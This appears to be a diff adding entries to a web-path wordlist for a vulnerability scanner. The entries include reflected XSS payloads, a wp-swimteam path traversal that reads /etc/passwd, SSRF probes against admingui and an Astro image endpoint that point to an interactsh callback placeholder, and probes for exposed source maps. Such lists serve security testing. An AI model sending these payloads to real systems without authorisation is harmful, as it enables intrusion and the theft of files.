@@ -187,3 +187,11 @@
 /index_en.php?from=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /index.php?from=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /cms/collect/getArticle
+/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress
+/vtigercrm/libraries/
+/vtigercrm/layouts/
+/admingui/version/Version?productNameSrc=http://{{interactsh-url}}/test.jpg&productNameHeight=500&productNameWidth=500
+/admingui/version/Masthead.jsp?productNameSrc=http://{{interactsh-url}}/test.jpg&productNameHeight=500&productNameWidth=500
+/pages/index.astro.mjs.map
+/index.astro.mjs.map
+/_image?href=//{{interactsh-url}}/600x400
